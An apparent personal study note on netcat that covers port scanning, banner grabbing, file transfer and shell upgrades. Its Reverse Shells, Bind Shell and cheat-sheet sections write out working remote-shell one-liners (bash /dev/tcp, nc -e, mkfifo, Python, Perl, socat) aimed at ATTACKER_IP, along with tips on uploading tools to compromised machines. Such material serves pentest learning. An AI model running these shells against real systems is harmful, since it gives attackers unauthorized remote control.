# Netcat — The Swiss Army Knife of Networking

#linux #cybersecurity #networking #reverse-shells #linux-basics-for-hackers

---

## 🗂️ Overview

**Netcat** (`nc`) is a simple but extremely powerful command-line tool that reads and writes data across network connections using TCP or UDP. It is called the **"Swiss Army Knife of networking"** because of how many different tasks it can perform with a single, lightweight tool.

```
nc [options] [host] [port]
```

Netcat creates a raw, direct connection between two endpoints — no protocol overhead, no encryption, just raw data flowing between two machines.

> [!info] Variants There are multiple implementations of netcat. The most common are:
> 
> - `nc` / `netcat` — traditional, may lack some features
> - `ncat` — from the Nmap project, supports SSL and more options
> - `nc.traditional` — Debian/Ubuntu legacy version
> - `nc.openbsd` — OpenBSD variant, common on modern Linux

```bash
# Check which version you have
nc --version
ncat --version
```

---

## 📡 Basic Connections

### Connect to a host (client mode)

```bash
nc 192.168.0.1 80              # connect to port 80
nc google.com 443              # connect to HTTPS port
nc 192.168.0.1 22              # connect to SSH port (banner grab)
```

### Listen for connections (server mode)

```bash
nc -l 4444                     # listen on port 4444 (one connection)
nc -lvp 4444                   # listen, verbose, port 4444
```

|Flag|Meaning|
|---|---|
|`-l`|Listen mode|
|`-v`|Verbose output|
|`-p`|Specify port|
|`-u`|Use UDP instead of TCP|
|`-n`|No DNS resolution (faster)|
|`-e`|Execute a program (not in all versions)|
|`-k`|Keep listening after connection closes|
|`-w`|Timeout in seconds|
|`-z`|Zero-I/O mode (port scanning)|

---

## 🔍 Port Scanning

Netcat can perform basic port scanning with `-z` (zero I/O — connect and immediately disconnect).

```bash
nc -zv 192.168.0.1 80              # check single port
nc -zv 192.168.0.1 20-100          # scan port range
nc -zvn 192.168.0.1 20-1000        # no DNS, faster
nc -zvu 192.168.0.1 53             # UDP port scan
```

```bash
# Scan a range and show only open ports
nc -zv 192.168.0.1 1-1000 2>&1 | grep succeeded
```

> [!tip] Hacking Note For serious port scanning always prefer `nmap`. But `nc -zv` is useful when nmap is not available on a compromised machine — it's often pre-installed everywhere.

---

## 🚩 Banner Grabbing

Connecting to an open port often returns a **service banner** — the service identifying itself. This is a quick way to fingerprint what's running without nmap.

```bash
nc -v 192.168.0.1 22             # SSH banner
nc -v 192.168.0.1 21             # FTP banner
nc -v 192.168.0.1 25             # SMTP banner
nc -v 192.168.0.1 80             # HTTP — send a request manually
```

### Manual HTTP request

```bash
nc 192.168.0.1 80
GET / HTTP/1.0
Host: 192.168.0.1
[press Enter twice]
```

Returns the full HTTP response including **Server** header — reveals web server type and version.

```
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)    ← version info → searchsploit
```

> [!tip] Hacking Note Banner grabbing is one of the first steps in **service enumeration** — knowing `Apache 2.4.41` or `OpenSSH 7.2` immediately tells you which CVEs to look for.

---

## 💀 Reverse Shells

A **reverse shell** makes the target connect back to the attacker — useful when the target is behind a firewall that blocks incoming connections.

```
Attacker (listening) ← Target (connects back)
```

### Attacker — set up listener

```bash
nc -lvp 4444                     # listen and wait
```

### Target — connect back with shell

```bash
# Linux (bash)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Using netcat with -e (if available)
nc ATTACKER_IP 4444 -e /bin/bash

# Without -e (most modern nc versions)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# Python fallback
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Perl fallback
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

> [!tip] Hacking Note The `-e` flag executes a program after connecting — it's the simplest reverse shell. But many modern distros ship netcat **without** `-e` as a security measure. The `mkfifo` version works universally without `-e`.

---

## 🔗 Bind Shell

A **bind shell** opens a listening shell on the target — the attacker connects to it. Opposite of a reverse shell.

```
Attacker (connects) → Target (listening with shell)
```

```bash
# On target — open shell listener
nc -lvp 4444 -e /bin/bash

# Without -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 4444 > /tmp/f

# On attacker — connect to it
nc TARGET_IP 4444
```

> [!warning] Bind shells require an open inbound port on the target — often blocked by firewalls. Reverse shells are generally preferred in real pentesting scenarios.

---

## 📁 File Transfer

Netcat can transfer files between machines — no FTP, no SCP needed.

```bash
# On receiver — listen and redirect to file
nc -lvp 4444 > received_file.txt

# On sender — send the file
nc RECEIVER_IP 4444 < file_to_send.txt
```

### Transfer a directory (with tar)

```bash
# On receiver
nc -lvp 4444 | tar xvf -

# On sender
tar cvf - /path/to/directory | nc RECEIVER_IP 4444
```

### Transfer a binary tool (e.g. linpeas to target)

```bash
# On attacker (sending)
nc -lvp 4444 < linpeas.sh

# On target (receiving)
nc ATTACKER_IP 4444 > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

> [!tip] Hacking Note File transfer via netcat is one of the quickest ways to **upload tools to a compromised machine** when you don't have SCP access or HTTP server running.

---

## 💬 Chat / Relay

Two terminals can communicate directly — useful for testing or simple covert communication.

```bash
# Machine A — listen
nc -lvp 4444

# Machine B — connect
nc MACHINE_A_IP 4444

# Now anything typed on either side appears on the other
```

### Relay / pipe between two connections

```bash
# Forward port 8080 to internal machine port 80
nc -lvp 8080 | nc 192.168.1.10 80
```

---

## 🔄 Upgrading a Netcat Shell

A raw netcat shell is **not a TTY** — `sudo`, `vim`, `ssh` won't work, Ctrl+C kills the shell. Upgrade it immediately after catching one.

### Method 1 — Python PTY

```bash
# Inside the netcat shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then on attacker side
Ctrl+Z                          # background the nc session
stty raw -echo; fg              # fix terminal settings
export TERM=xterm               # fix terminal type
```

### Method 2 — Upgrade to Socat

```bash
# On attacker — open socat listener on a different port
socat TCP-LISTEN:4445 FILE:`tty`,raw,echo=0

# Inside the netcat shell on target
socat TCP:ATTACKER_IP:4445 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

→ See [[Socat]] for full PTY shell detail.

### Method 3 — Script

```bash
# Inside the netcat shell
script /dev/null -c bash
```

---

## 🖥️ Persistent Listener

Keep netcat listening even after a connection closes:

```bash
nc -lvkp 4444                   # -k = keep open after disconnect
nc -lvkp 4444 -e /bin/bash      # persistent bind shell
```

---

## ⚖️ Netcat vs Socat vs Ncat

|Feature|Netcat (nc)|Socat|Ncat|
|---|---|---|---|
|Basic TCP/UDP|✅|✅|✅|
|SSL encryption|❌|✅|✅|
|Full PTY shell|❌|✅|❌|
|Port forwarding|Basic|✅|✅|
|Broker mode|❌|❌|✅|
|Pre-installed|Often ✅|Rarely|Rarely|
|`-e` flag|Sometimes|N/A|✅|
|Complexity|Low|High|Medium|

---

## 🔗 Command Cheat Sheet

```bash
# Basic
nc -lvp 4444                                         # listen
nc HOST PORT                                         # connect

# Port scanning
nc -zv HOST 1-1000 2>&1 | grep succeeded             # scan range
nc -zvn HOST 80                                      # single port, no DNS

# Banner grabbing
nc -v HOST 22                                        # grab SSH banner
nc -v HOST 80                                        # grab HTTP banner

# Reverse shell listener
nc -lvp 4444                                         # catch incoming shell

# Reverse shell (target side)
bash -i >& /dev/tcp/ATTACKER/4444 0>&1               # bash
nc ATTACKER 4444 -e /bin/bash                        # nc with -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER 4444>/tmp/f  # no -e

# Bind shell
nc -lvp 4444 -e /bin/bash                            # target listens
nc TARGET 4444                                       # attacker connects

# File transfer
nc -lvp 4444 > file.txt                              # receive
nc HOST 4444 < file.txt                              # send

# Shell upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'      # inside shell
```

---

## 🔗 Related Notes

- [[Socat]]
- [[Tor]]
- [[LinuxCommands/Nmap]]
- [[Privilege Escalation Techniques]]
- [[Finding_Files]]

---

_References: man nc · man ncat · https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/nc-mkfifo · Linux Basics for Hacking — OccupyTheWeb_